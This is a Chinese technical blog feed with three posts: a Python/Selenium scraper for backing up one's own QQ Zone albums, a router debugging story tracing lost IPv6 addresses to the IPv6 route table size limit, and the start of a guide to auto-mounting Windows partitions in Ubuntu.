        <content type="html"><![CDATA[<p>自毕业后，就再也没有用过QQ，QQ空间里记录的是些并不精彩的青葱岁月，但好歹也是份回忆，近日想着学以致用，用<code>Python</code>把QQ空间相册的所有照片爬取下来，以作备份。</p><h2 id="分析QQ空间"><a href="#分析QQ空间" class="headerlink" title="分析QQ空间"></a>分析QQ空间</h2><h3 id="登录QQ空间"><a href="#登录QQ空间" class="headerlink" title="登录QQ空间"></a>登录QQ空间</h3><p>爬取第一步，分析站点，首先需要知道如何登录QQ空间。最初想法是用<code>requests</code>库配置登录请求，模拟登录，但是不久便放弃了这一思路，请看下图↓</p><p><img src="/assets/qqzone/login.png" alt="login"></p><p>根据登录按钮绑定的监听事件可以追踪到该按钮的点击事件如下：</p><p><img src="/assets/qqzone/login_func.png" alt="login function"></p><p>账号加密是必然的，但这一堆堆的代码真心不好解析，有耐心的勇士尽情一试！</p><p>在排除这种登录方法后，选择<code>selenium</code>模拟用户登录不失为省时省力的方法，而且我们只是需要通过<code>selenium</code>完成登录，获取到<code>Cookies</code>和后面讲述的<code>g_tk</code>参数后，就可以停用了，所以效率并不太低。</p><h3 id="分析空间相册"><a href="#分析空间相册" class="headerlink" title="分析空间相册"></a>分析空间相册</h3><p>登录以后，页面会跳转至 <a href="javascript:;">https://user.qzone.qq.com/{QQ_NUMBER}</a>, 这时把鼠标移到导航栏你会发现，所有的导航栏链接都是<code>javascript:;</code> 😳。没错就是这么坑，一切都是暗箱操作。</p><p>当然这并不难处理，使用调试工具捕获点击后产生的请求，然后过滤出正确的请求包即可。因为网络包非常多，那么怎么过滤呢，猜想相册数据的API必然会返回个列表<code>list</code>，尝试过滤<code>list</code>然后逐个排除，最后定位到请求包。下面是通过<code>fcg_list</code>过滤后的数据包，列表信息以<code>jsonp</code>格式返回，稍作处理即可当做<code>json</code>格式来读取（后面有讲）。</p><p><img src="/assets/qqzone/album_list.png" alt="album list"></p><p>从<code>Headers</code>和<code>Response</code>可以分别获取到两组<strong>重要</strong>信息：</p><ol><li><code>request</code> 获取相册列表所需的请求信息，包括请求链接和参数</li><li><code>response</code> 数据包包含的所有相册的信息，是每个相册所含照片对应的请求包参数的数据来源</li></ol><p>先看请求包：</p><pre><code class="yml"># urlhttps://h5.qzone.qq.com/proxy/domain/photo.qzone.qq.com/fcgi-bin/fcg_list_album_v3# argsg_tk: 477819917callback: shine0_Callbackt: 691481346hostUin: 123456789uin: 123456789appid: 4inCharset: utf-8outCharset: utf-8source: qzoneplat: qzoneformat: jsonpnotice: 0filter: 1handset: 4pageNumModeSort: 40pageNumModeClass: 15needUserInfo: 1idcNum: 4callbackFun: shine0_: 1551788226819</code></pre><p>其中<code>hostUin</code>, <code>uin</code>都是QQ号，<code>g_tk</code>是必须的且每次重新登录都会更新（后面有讲如何获取），其它有些参数不是必须的，我尝试后整理出如下请求参数：</p><pre><code class="python">query = &#123;    &#39;g_tk&#39;: self.g_tk,    &#39;hostUin&#39;: self.username,    &#39;uin&#39;: self.username,    &#39;appid&#39;: 4,    &#39;inCharset&#39;: &#39;utf-8&#39;,    &#39;outCharset&#39;: &#39;utf-8&#39;,    &#39;source&#39;: &#39;qzone&#39;,    &#39;plat&#39;: &#39;qzone&#39;,    &#39;format&#39;: &#39;jsonp&#39;&#125;</code></pre><p>接下来看<code>jsonp</code>格式的跨域响应包：</p><pre><code class="json">shine0_Callback(&#123;    &quot;code&quot;:0,    &quot;subcode&quot;:0,    &quot;message&quot;:&quot;&quot;,    &quot;default&quot;:0,    &quot;data&quot;:&#123;   &quot;albumListModeSort&quot; : [      &#123;         &quot;allowAccess&quot; : 1,         &quot;anonymity&quot; : 0,         &quot;bitmap&quot; : &quot;10000000&quot;,         &quot;classid&quot; : 106,         &quot;comment&quot; : 11,         &quot;createtime&quot; : 1402661881,         &quot;desc&quot; : &quot;&quot;,         &quot;handset&quot; : 0,         &quot;id&quot; : &quot;V13LmPKk0JLNRY&quot;,         &quot;lastuploadtime&quot; : 1402662103,         &quot;modifytime&quot; : 1408271987,         &quot;name&quot; : &quot;毕业季&quot;,         &quot;order&quot; : 0,         &quot;pre&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfGuwSk58K2rQY!\/a\/dIY29GUbJgAA&quot;,         &quot;priv&quot; : 1,         &quot;pypriv&quot; : 1,         &quot;total&quot; : 4,         &quot;viewtype&quot; : 0      &#125;,</code></pre><p>shine0_Callback是请求包的<code>callbackFun</code>参数决定的，如果没这个参数，响应包会以<code>_Callback</code>作为默认名，当然这都不重要。所有相册信息以<code>json</code>格式存入<code>albumListModeSort</code>中，上面仅截取了一个相册的信息。</p><p>相册信息中，<code>name</code>代表相册名称，<code>id</code>作为唯一标识可用于请求该相册内的照片信息，而<code>pre</code>仅仅是一个预览缩略图的链接，无关紧要。</p><h3 id="分析单个相册"><a href="#分析单个相册" class="headerlink" title="分析单个相册"></a>分析单个相册</h3><p>与获取相册信息类似，进入某一相册，使用<code>cgi_list</code>过滤数据包，找到该相册的照片信息</p><p><img src="/assets/qqzone/photo_list.png" alt="photo list"></p><p>同样的道理，根据数据包可以获取照片列表信息的请求包和响应信息，先看请求：</p><pre><code class="yml"># urlhttps://h5.qzone.qq.com/proxy/domain/photo.qzone.qq.com/fcgi-bin/cgi_list_photo# argsg_tk: 477819917callback: shine0_Callbackt: 952444063mode: 0idcNum: 4hostUin: 123456789topicId: V13LmPKk0JLNRYnoTopic: 0uin: 123456789pageStart: 0pageNum: 30skipCmtCount: 0singleurl: 1batchId:notice: 0appid: 4inCharset: utf-8outCharset: utf-8source: qzoneplat: qzoneoutstyle: jsonformat: jsonpjson_esc: 1question:answer:callbackFun: shine0_: 1551790719497</code></pre><p>其中有几个关键参数：</p><ol><li><code>g_tk</code> - 与相册列表参数一致</li><li><code>topicId</code> - 与相册列表参数中的<code>id</code>一致</li><li><code>pageStart</code> - 本次请求照片的起始编号</li><li><code>pageNum</code> - 本次请求的照片数量</li></ol><blockquote><p>为了一次性获取所有照片，可以将<code>pageStart</code>设为0，<code>pageNum</code>设为所有相册所含照片的最大值。</p></blockquote><p>同样可以对上面的参数进行简化，在相册列表请求参数的基础上添加<code>topicId</code>，<code>pageStart</code>和<code>pageNum</code>三个参数即可。</p><p>下面来看返回的照片列表信息：</p><pre><code class="json">shine0_Callback(&#123;    &quot;code&quot;:0,    &quot;subcode&quot;:0,    &quot;message&quot;:&quot;&quot;,    &quot;default&quot;:0,    &quot;data&quot;:&#123;   &quot;limit&quot; : 0,   &quot;photoList&quot; : [      &#123;         &quot;batchId&quot; : &quot;1402662093402000&quot;,         &quot;browser&quot; : 0,         &quot;cameratype&quot; : &quot; &quot;,         &quot;cp_flag&quot; : false,         &quot;cp_x&quot; : 455,         &quot;cp_y&quot; : 388,         &quot;desc&quot; : &quot;&quot;,         &quot;exif&quot; : &#123;            &quot;exposureCompensation&quot; : &quot;&quot;,            &quot;exposureMode&quot; : &quot;&quot;,            &quot;exposureProgram&quot; : &quot;&quot;,            &quot;exposureTime&quot; : &quot;&quot;,            &quot;flash&quot; : &quot;&quot;,            &quot;fnumber&quot; : &quot;&quot;,            &quot;focalLength&quot; : &quot;&quot;,            &quot;iso&quot; : &quot;&quot;,            &quot;lensModel&quot; : &quot;&quot;,            &quot;make&quot; : &quot;&quot;,            &quot;meteringMode&quot; : &quot;&quot;,            &quot;model&quot; : &quot;&quot;,            &quot;originalTime&quot; : &quot;&quot;         &#125;,         &quot;forum&quot; : 0,         &quot;frameno&quot; : 0,         &quot;height&quot; : 621,         &quot;id&quot; : 0,         &quot;is_video&quot; : false,         &quot;is_weixin_mode&quot; : 0,         &quot;ismultiup&quot; : 0,         &quot;lloc&quot; : &quot;NDN0sggyKs3smlOg6eYghjb0ZRsmAAA!&quot;,         &quot;modifytime&quot; : 1402661792,         &quot;name&quot; : &quot;QQ图片20140612104616&quot;,         &quot;origin&quot; : 0,         &quot;origin_upload&quot; : 0,         &quot;origin_url&quot; : &quot;&quot;,         &quot;owner&quot; : &quot;123456789&quot;,         &quot;ownername&quot; : &quot;123456789&quot;,         &quot;photocubage&quot; : 91602,         &quot;phototype&quot; : 1,         &quot;picmark_flag&quot; : 0,         &quot;picrefer&quot; : 1,         &quot;platformId&quot; : 0,         &quot;platformSubId&quot; : 0,         &quot;poiName&quot; : &quot;&quot;,         &quot;pre&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfSk58K2rQY!\/a\/dIY29GUbJgAA&amp;bo=pANtAgAAAAABCeY!&quot;,         &quot;raw&quot; : &quot;http:\/\/r.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfSk58K2rQY!\/r\/dIY29GUbJgAA&quot;,         &quot;raw_upload&quot; : 1,         &quot;rawshoottime&quot; : 0,         &quot;shoottime&quot; : 0,         &quot;shorturl&quot; : &quot;&quot;,         &quot;sloc&quot; : &quot;NDN0sggyKs3smlOg6eYghjb0ZRsmAAA!&quot;,         &quot;tag&quot; : &quot;&quot;,         &quot;uploadtime&quot; : &quot;2014-06-13 20:21:33&quot;,         &quot;url&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfSk58K2rQY!\/b\/dIY29GUbJgAA&amp;bo=pANtAgAAAAABCeY!&quot;,         &quot;width&quot; : 932,         &quot;yurl&quot; : 0      &#125;,      // ...   ]   &quot;t&quot; : &quot;952444063&quot;,   &quot;topic&quot; : &#123;      &quot;bitmap&quot; : &quot;10000000&quot;,      &quot;browser&quot; : 0,      &quot;classid&quot; : 106,      &quot;comment&quot; : 1,      &quot;cover_id&quot; : &quot;NDN0sggyKs3smlOg6eYghjb0ZRsmAAA!&quot;,      &quot;createtime&quot; : 1402661881,      &quot;desc&quot; : &quot;&quot;,      &quot;handset&quot; : 0,      &quot;id&quot; : &quot;V13LmPKk0JLNRY&quot;,      &quot;is_share_album&quot; : 0,      &quot;lastuploadtime&quot; : 1402662103,      &quot;modifytime&quot; : 1408271987,      &quot;name&quot; : &quot;毕业季&quot;,      &quot;ownerName&quot; : &quot;707922098&quot;,      &quot;ownerUin&quot; : &quot;707922098&quot;,      &quot;pre&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfGuwSk58K2rQY!\/a\/dIY29GUbJgAA&quot;,      &quot;priv&quot; : 1,      &quot;pypriv&quot; : 1,      &quot;share_album_owner&quot; : 0,      &quot;total&quot; : 4,      &quot;url&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfGuwSk58K2rQY!\/b\/dIY29GUbJgAA&quot;,      &quot;viewtype&quot; : 0   &#125;,   &quot;totalInAlbum&quot; : 4,   &quot;totalInPage&quot; : 4&#125;</code></pre><p>返回的照片信息都存于<code>photoList</code>, 上面同样只截取了一张照片的信息，后面一部分返回的是当前相册的一些基本信息。<code>totalInAlbum</code>， <code>totalInPage</code>存储了当前相册总共包含的照片数及本次返回的照片数。而我们需要下载的图片链接则是<code>url</code>！</p><p>OK, 到此，所有请求和响应数据都分析清楚了，接下来便是<code>coding</code>的时候了。</p><h2 id="确定爬取方案"><a href="#确定爬取方案" class="headerlink" title="确定爬取方案"></a>确定爬取方案</h2><ol><li>创建<code>qqzone</code>类，初始化用户信息</li><li>使用<code>Selenium</code>模拟登录</li><li>获取<code>Cookies</code>和<code>g_tk</code></li><li>使用<code>requests</code>获取相册列表信息</li><li>遍历相册，获取照片列表信息并下载照片</li></ol><h3 id="创建qqzone类"><a href="#创建qqzone类" class="headerlink" title="创建qqzone类"></a>创建qqzone类</h3><pre><code class="python">class qqzone(object):    &quot;&quot;&quot;QQ空间相册爬虫&quot;&quot;&quot;    def __init__(self, user):        self.username = user[&#39;username&#39;]        self.password = user[&#39;password&#39;]</code></pre><h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><pre><code class="python">from selenium import webdriverfrom selenium.webdriver.common.keys import Keysfrom selenium.common.exceptions import WebDriverExceptio# ...def _login_and_get_args(self):    &quot;&quot;&quot;登录QQ，获取Cookies和g_tk&quot;&quot;&quot;    opt = webdriver.ChromeOptions()    opt.set_headless()    driver = webdriver.Chrome(chrome_options=opt)    driver.get(&#39;https://i.qq.com/&#39;)    # time.sleep(2)    logging.info(&#39;User &#123;&#125; login...&#39;.format(self.username))    driver.switch_to.frame(&#39;login_frame&#39;)    driver.find_element_by_id(&#39;switcher_plogin&#39;).click()    driver.find_element_by_id(&#39;u&#39;).clear()    driver.find_element_by_id(&#39;u&#39;).send_keys(self.username)    driver.find_element_by_id(&#39;p&#39;).clear()    driver.find_element_by_id(&#39;p&#39;).send_keys(self.password)    driver.find_element_by_id(&#39;login_button&#39;).click()    time.sleep(1)    driver.get(&#39;https://user.qzone.qq.com/&#123;&#125;&#39;.format(self.username))</code></pre><p>此处需要注意的是：</p><ol><li>使用<code>selenium</code>需要安装对应的<code>webdriver</code></li><li>可以通过<code>webdriver.Chrome()</code>指定浏览器位置，否则默认从环境变量定义的路径查找</li><li>如果电脑打开浏览器较慢，可能需要在<code>driver.get</code>后<code>sleep</code>几秒</li></ol><h3 id="获取-Cookies"><a href="#获取-Cookies" class="headerlink" title="获取 Cookies"></a>获取 Cookies</h3><p>使用<code>selenium</code>获取<code>Cookies</code>非常方便</p><pre><code class="python">self.cookies = driver.get_cookies()</code></pre><h3 id="获取-g-tk"><a href="#获取-g-tk" class="headerlink" title="获取 g_tk"></a>获取 g_tk</h3><p>获取<code>g_tk</code>最开始可以说是本爬虫最大的难点，因为从网页中根本找不到直接写明的数值，只有各种函数调用。为此我全局搜索，发现好多地方都有其获取方式。</p><p><img src="/assets/qqzone/g_tk.png" alt="g_tk"></p><p>最后选择了其中一处，通过<code>selenium</code>执行脚本的功能成功获取到了<code>g_tk</code>！</p><pre><code class="python">self.g_tk = driver.execute_script(&#39;return QZONE.FP.getACSRFToken()&#39;)</code></pre><p>到此，<code>selenium</code>的使命就完成了，剩下的将通过<code>requests</code>来完成。</p><h3 id="初始化-request-Session"><a href="#初始化-request-Session" class="headerlink" title="初始化 request.Session"></a>初始化 request.Session</h3><p>接下来需要逐步生成请求然后获取数据。但是为方便起见，这里使用会话的方式请求数据，配置好<code>cookie</code>和<code>headers</code>，省的每次请求都设置一遍。</p><pre><code class="python">def _init_session(self):    self.session = requests.Session()    for cookie in self.cookies:        self.session.cookies.set(cookie[&#39;name&#39;], cookie[&#39;value&#39;])    self.session.headers = &#123;        &#39;Referer&#39;: &#39;https://qzs.qq.com/qzone/photo/v7/page/photo.html?init=photo.v7/module/albumList/index&amp;navBar=1&#39;,        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36&#39;    &#125;</code></pre><h3 id="请求相册信息"><a href="#请求相册信息" class="headerlink" title="请求相册信息"></a>请求相册信息</h3><p>获取相册信息，需要先封装好请求参数，然后通过<code>session.get</code>爬取数据，再通过正则匹配以<code>json</code>格式读取<code>jsonp</code>数据，最后解析所需的<code>name</code>和<code>id</code>。</p><pre><code class="python">def _get_ablum_list(self):    &quot;&quot;&quot;获取相册的列表信息&quot;&quot;&quot;    album_url = &#39;&#123;&#125;&#123;&#125;&#39;.format(        &#39;https://h5.qzone.qq.com/proxy/domain/photo.qzone.qq.com/fcgi-bin/fcg_list_album_v3?&#39;,        self._get_query_for_request())    logging.info(&#39;Getting ablum list id...&#39;)    resp = self.session.get(album_url)    data = self._load_callback_data(resp)    album_list = &#123;&#125;    for item in data[&#39;data&#39;][&#39;albumListModeSort&#39;]:        album_list[item[&#39;name&#39;]] = item[&#39;id&#39;]    return album_list</code></pre><p>其中的参数组合来自下面的函数<code>_get_query_for_request</code>函数。</p><pre><code class="python">def _get_query_for_request(self, topicId=None, pageStart=0, pageNum=100):    &quot;&quot;&quot;获取请求相册信息或照片信息所需的参数    Args:        topicId: 每个相册对应的唯一标识符        pageStart: 请求某个相册的照片列表信息所需的起始页码        pageNum: 单次请求某个相册的照片数量    Returns:        一个组合好所有请求参数的字符串    &quot;&quot;&quot;    query = &#123;        &#39;g_tk&#39;: self.g_tk,        &#39;hostUin&#39;: self.username,        &#39;uin&#39;: self.username,        &#39;appid&#39;: 4,        &#39;inCharset&#39;: &#39;utf-8&#39;,        &#39;outCharset&#39;: &#39;utf-8&#39;,        &#39;source&#39;: &#39;qzone&#39;,        &#39;plat&#39;: &#39;qzone&#39;,        &#39;format&#39;: &#39;jsonp&#39;    &#125;    if topicId:        query[&#39;topicId&#39;] = topicId        query[&#39;pageStart&#39;] = pageStart        query[&#39;pageNum&#39;] = pageNum    return &#39;&amp;&#39;.join(&#39;&#123;&#125;=&#123;&#125;&#39;.format(key, val) for key, val in query.items())</code></pre><p>其中的<code>jsonp</code>解析函数如下，主体部分就是一个正则匹配，非常简单。</p><pre><code class="Python">def _load_callback_data(self, resp):    &quot;&quot;&quot;以json格式解析返回的jsonp数据&quot;&quot;&quot;    try:        resp.encoding = &#39;utf-8&#39;        data = loads(re.search(r&#39;.*?\((&#123;.*&#125;).*?\).*&#39;, resp.text, re.S)[1])        return data    except ValueError:        logging.error(&#39;Invalid input&#39;)</code></pre><h3 id="解析并下载照片"><a href="#解析并下载照片" class="headerlink" title="解析并下载照片"></a>解析并下载照片</h3><p>获取相册列表后，逐个请求照片列表信息，进而逐一下载</p><pre><code class="python">def _get_photo(self, album_name, album_id):    &quot;&quot;&quot;获取单个相册的照片列表信息，并下载该相册所有照片&quot;&quot;&quot;    photo_list_url = &#39;&#123;&#125;&#123;&#125;&#39;.format(        &#39;https://h5.qzone.qq.com/proxy/domain/photo.qzone.qq.com/fcgi-bin/cgi_list_photo?&#39;,        self._get_query_for_request(topicId=album_id))    logging.info(&#39;Getting photo list for album &#123;&#125;...&#39;.format(album_name))    resp = self.session.get(photo_list_url)    data = self._load_callback_data(resp)    if data[&#39;data&#39;][&#39;totalInPage&#39;] == 0:        return None    file_dir = self.get_path(album_name)    for item in data[&#39;data&#39;][&#39;photoList&#39;]:        path = &#39;&#123;&#125;/&#123;&#125;.jpg&#39;.format(file_dir, item[&#39;name&#39;])        logging.info(&#39;Downloading &#123;&#125;-&#123;&#125;&#39;.format(album_name, item[&#39;name&#39;]))        self._download_image(item[&#39;url&#39;], path)</code></pre><p>下载图片也是通过<code>request</code>,记得设置超时时间。</p><pre><code class="python">def _download_image(self, url, path):    &quot;&quot;&quot;下载单张照片&quot;&quot;&quot;    try:        resp = self.session.get(url, timeout=15)        if resp.status_code == 200:            open(path, &#39;wb&#39;).write(resp.content)    except requests.exceptions.Timeout:        logging.warning(&#39;get &#123;&#125; timeout&#39;.format(url))    except requests.exceptions.ConnectionError as e:        logging.error(e.__str__)    finally:        pass</code></pre><h2 id="爬取测试"><a href="#爬取测试" class="headerlink" title="爬取测试"></a>爬取测试</h2><ul><li>爬取过程</li></ul><p><img src="/assets/qqzone/downloading.png" alt="capturing"></p><ul><li>爬取结果</li></ul><p><img src="/assets/qqzone/downloaded_photos.png" alt="downloaded photos"></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><ol><li>如果将请求参数中的<code>format</code>由<code>jsonp</code>改成<code>json</code>，则可以直接获取<code>json</code>数据</li><li>本用例并未使用多进程或多线程，所以速率不算快，还有待优化的地方</li><li>该爬虫已存放至开源项目<a href="https://github.com/Litreily/capturer">Github capturer</a>，欢迎交流</li></ol>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spider </tag>
            
            <tag> qqzone </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次Client无法获取IPv6地址问题的分析过程</title>
      <link href="2019/02/27/ipv6/"/>
      <url>2019/02/27/ipv6/</url>
      
        <content type="html"><![CDATA[<p>近日SQA报了一个bug，对路由器经过6天左右的压力测试后，无论是有线设备还是无线设备都拿不到<code>IPv6</code>地址了。经过层层分析发现可能是<code>kernel</code>内存泄漏。本文便记录这一问题的分析过程。</p><span id="more"></span><h2 id="检查网络状态"><a href="#检查网络状态" class="headerlink" title="检查网络状态"></a>检查网络状态</h2><p>首先打开Router的console，使用<code>ifconfig br0</code>(br0是Router LAN端的桥接地址)查看当前的网络状态</p><pre><code class="sh">$ ifconfig br0br0       Link encap:Ethernet  HWaddr A0:63:91:A7:63:07            inet addr:192.168.27.1  Bcast:192.168.27.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:530995052 errors:0 dropped:0 overruns:0 frame:0          TX packets:1012058984 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0          RX bytes:108097854210 (100.6 GiB)  TX bytes:1331062907089 (1.2 TiB)</code></pre><p>可以看到，Router自身也只有<code>IPv4</code>地址，没有<code>IPv6</code>地址，所以问题出在Router自身，不可能是Client配置错误，那为什么Router自己都没有拿到<code>IPv6</code>呢？下面来分析压力测试过程保存的console log.</p><h2 id="分析console-log"><a href="#分析console-log" class="headerlink" title="分析console log"></a>分析console log</h2><p>在压力测试的前几天，从以下log可知Router是有<code>IPv6</code>的，Router貌似正常运行几天后就失去了<code>Ipv6</code></p><pre><code class="sh">br0       Link encap:Ethernet  HWaddr A0:63:91:A7:63:07            inet addr:192.168.27.1  Bcast:192.168.27.255  Mask:255.255.255.0          inet6 addr: 2002:76a7:859d:0:44f3:adff:fef9:f52/64 Scope:Global          inet6 addr: fe80::a263:91ff:fea7:6307/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:1184678 errors:0 dropped:0 overruns:0 frame:0          TX packets:1476645 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0          RX bytes:1200677624 (1.1 GiB)  TX bytes:1867999218 (1.7 GiB)</code></pre><p>其中的<code>IPv6</code>地址如下：</p><pre><code class="sh">inet6 addr: 2002:76a7:859d:0:44f3:adff:fef9:f52/64 Scope:Globalinet6 addr: fe80::a263:91ff:fea7:6307/64 Scope:Link</code></pre><p>第一个<code>IPv6</code>是用来与外部互联网通信的地址，第二个以<code>fe80::</code>开头的称为链路本地地址(Link-local address)，与<code>IPv4</code>中的<code>169.254.0.0/16</code>地址类似，此类地址不需要与外部网络通信，通常用于本地主机间的相互通讯。</p><h2 id="IPv6相关进程分析"><a href="#IPv6相关进程分析" class="headerlink" title="IPv6相关进程分析"></a>IPv6相关进程分析</h2><p>好了，现在的问题是什么导致<code>IPv6</code>忽然不见了，我最初想法是Router的<code>dhcpv6</code>服务器挂了，但是<code>ps |grep dhcp</code>后发现是正常的。</p><pre><code class="sh">$ ps |grep dhcp 2951 root        368 S   udhcpd /tmp/udhcpd.conf28323 root        352 S   /usr/sbin/dhcp6s -3 -c /tmp/dhcp6s.conf br0</code></pre><p>此处说明一点，由于WAN端使用的<code>PPPoE</code>拨号上网方式，所以没有启动<code>dhcp6c</code>（用于获取ipv6的客户端程序）。那是不是还有其它相关的进程挂了呢？为此我问了下组长（大牛），发现确实还有个<code>radvd</code>进程！对比前后<code>log</code>中的<code>ps</code>输出发现确实是这个进程挂了！！！</p><blockquote><p><strong>路由广播守护</strong>（The Router Advertisement Daemon，简称：<code>radvd</code>）是一个符合<code>RFC 2461</code>使用邻居发现协议用于实现<code>IPv6</code>地址本地链接广播和<code>IPv6</code>路由前缀的开源软件。该软件是给系统管理员用于实现在<code>IPv6</code>下对主机进行无状态自动配置地址。<br>--- <a href="https://zh.wikipedia.org/wiki/Radvd">维基百科</a></p></blockquote><p>总之，<code>radvd</code>也是<code>IPv6</code>必不可少的进程，而且莫名其妙的挂了。</p><h2 id="radvd进程退出原因分析"><a href="#radvd进程退出原因分析" class="headerlink" title="radvd进程退出原因分析"></a>radvd进程退出原因分析</h2><p>为了分析<code>radvd</code>进程退出原因，我尝试手动重启进程</p><pre><code class="sh">$ /usr/sbin/radvd -C /tmp/radvd.conf[Feb 26 06:29:51] radvd: syntax error in /tmp/radvd.conf, line 19: &#123;[Feb 26 06:29:51] radvd: error parsing or activating the config file: /tmp/radvd.conf</code></pre><p>提示配置文件第19语法错误，那来看一下<code>/tmp/radvd.conf</code></p><pre><code class="sh">$ cat /tmp/radvd.confinterface br0 &#123;        AdvSendAdvert on;        AdvCurHopLimit 64;        MinRtrAdvInterval 198;        MaxRtrAdvInterval 600;        AdvOtherConfigFlag on;        AdvDefaultLifetime 1800;        AdvReachableTime 0;        AdvRetransTimer 0;        AdvDefaultPreference low;        AdvHomeAgentFlag off;        AdvManagedFlag off;        prefix 2002:24e0:69cf:0::/64 &#123;                AdvOnLink on;                AdvAutonomous on;                AdvValidLifetime 2400;                AdvPreferredLifetime 1800;        &#125;;        RDNSS  &#123;                AdvRDNSSPreference 8;                AdvRDNSSLifetime 1200;        &#125;;&#125;;</code></pre><p>第19行<code>RDNSS  &#123;</code>与正常情况<code>RDNSS  fe80::a263:91ff:fea7:6307 &#123;</code>相比少了链路本地地址，也就是<code>fe80::</code>开头的地址。那么这个问题是怎么产生的呢？为什么会少参数呢？这就需要来看具体的代码了。</p><h2 id="net6conf脚本分析"><a href="#net6conf脚本分析" class="headerlink" title="net6conf脚本分析"></a>net6conf脚本分析</h2><p>分析GUI相关代码后发现，在点击Router的<code>IPv6</code>配置页面的<code>Apply</code>按钮后，后台会执行<code>net6conf restart</code>，那么就需要分析<code>net6conf</code>代码</p><pre><code class="sh">$ grep -rn fe80:: net6confnet6conf:97:    $IP -6 addr add fe80::$eui64/64 dev $bridgenet6conf:103:   $IP -6 addr add fe80::$ipv6_interface_id/64 dev $bridge</code></pre><p>使用<code>grep</code>初步定位到链路本地地址的生成处，由于<code>net6conf</code>是个<code>shell</code>脚本，所以可以在代码附近添加一行<code>set -x</code>，然后手动执行<code>net6conf restart</code>，那么代码执行过程就会很详细的打印出来，接着找到生成链路本地地址的那一部分</p><pre><code class="sh">+ /usr/sbin/ip -6 addr add fe80::a263:91ff:fea7:6307/64 dev br0RTNETLINK answers: Cannot allocate memory</code></pre><p>OK，总算找到问题的关键所在了，程序在添加地址时出现了无法内存分配的错误。</p><h2 id="无法分配内存原因分析"><a href="#无法分配内存原因分析" class="headerlink" title="无法分配内存原因分析"></a>无法分配内存原因分析</h2><p>对于<code>RTNETLINK answers: Cannot allocate memory</code>,常规思路当然是内存不足了，但是通过<code>free</code>查看还有<code>200M+</code>绝对足够。然后谷歌一下，貌似遇到类似问题的也不少，比如<a href="https://bugzilla.redhat.com/show_bug.cgi?id=1221915">IPv6 routing/neighbor table suspected memory leak</a>，也是跑了几天就出这个问题了。</p><p>大部分的解决方案是修改一个系统级的配置参数<code>net.ipv6.route.max_size</code>，这个参数定义了<code>IPv6</code>路由表的最大尺寸，默认值为4096Bytes，将其改大一点就可以了。</p><pre><code class="sh">$ sysctl net.ipv6.route.max_sizenet.ipv6.route.max_size = 4096$ sysctl -w net.ipv6.route.max_size=16384net.ipv6.route.max_size = 16384$ /usr/sbin/ip -6 addr add fe80::a263:91ff:fea7:6307/64 dev br0</code></pre><p>修改完后重启<code>IPv6</code>，发现一切都回归正常了，Oh yeah😀</p><p>那么最后还剩一个问题，按理说<code>net.ipv6.route.max_size</code>是系统自带的默认参数，参数值也是经过实践验证的，一般来说是够用的，为什么会出现不够用的情况？依据网上的资料显示，可能是kernel memory leak, 具体原因还需进一步测试和验证，但至少目前增大这个参数确实能够解决问题！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zh.wikipedia.org/wiki/Radvd">wikipedia - radvd</a></li><li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1221915">IPv6 routing/neighbor table suspected memory leak</a></li><li><a href="http://ipv6.web.cern.ch/content/linux-ipv6-routing-table-maxsize-badly-dimensioned-compared-ipv4">Linux IPv6 routing table max_size badly dimensioned compared to IPv4</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IPv6 </tag>
            
            <tag> router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu开机自动挂载Windows系统中的磁盘分区</title>
      <link href="2019/02/17/mount/"/>
      <url>2019/02/17/mount/</url>
      
        <content type="html"><![CDATA[<p>本人电脑装有<code>ubuntu</code>和<code>windows</code>双系统，有时候需要在<code>ubuntu</code>下使用<code>windows</code>系统下的文件，每次手动挂载的话很麻烦，所以想让它开机自动挂载常用的<code>windows</code>磁盘分区。</p><h2 id="查看分区"><a href="#查看分区" class="headerlink" title="查看分区"></a>查看分区</h2><p>在挂载windows磁盘前，需要知道每个磁盘的路径或<code>UUID</code>，此时主要依靠<code>fdisk</code>和<code>blkid</code>两个指令，前一个指令获取分区信息，后一个指令获取<code>Block device</code>块设备的属性。</p><pre><code class="sh">$ sudo blkid/dev/sda1: LABEL=&quot;Win10&quot; UUID=&quot;C4A0E65EA0E65708&quot; TYPE=&quot;ntfs&quot; PARTUUID=&quot;6190c592-01&quot;/dev/sda2: UUID=&quot;AE3C137D3C133FAF&quot; TYPE=&quot;ntfs&quot; PARTUUID=&quot;6190c592-02&quot;/dev/sdb1: LABEL=&quot;Apps&quot; UUID=&quot;0000678400004823&quot; TYPE=&quot;ntfs&quot; PARTLABEL=&quot;Basic data partition&quot; 